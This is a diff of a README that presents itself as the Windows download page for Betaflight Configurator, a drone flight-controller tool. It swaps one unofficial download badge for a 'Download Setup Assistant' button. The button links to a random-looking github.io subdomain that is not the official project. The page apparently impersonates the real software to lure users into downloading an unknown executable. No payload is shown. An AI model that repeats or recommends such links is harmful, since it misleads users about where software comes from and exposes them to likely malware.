@@ -5,13 +5,7 @@
 
 <h1 align="center">🛩️ Betaflight Configurator (Windows)</h1>
 
-<p align="center">
-  <a href="https://betaflight-configurator-download-pc.github.io/.github/" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️%20Download%20Betaflight%20Configurator-Windows-1E90FF?style=for-the-badge&logo=windows&logoColor=white"
-         alt="Download Betaflight Configurator for Windows"
-         style="width:560px;height:44px;">
-  </a>
-</p>
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-lightgrey)](https://razzanoshavonsaxsvrl.github.io/.github/betaflight-configurator)
 
 <p align="center">
   <img src="https://dl.flathub.org/media/io/github/betaflight.BetaflightConfigurator.desktop/d365efa464cecb095818db74d063ca60/screenshots/image-3_orig.webp" alt="Betaflight Configurator Interface Preview" width="700" />
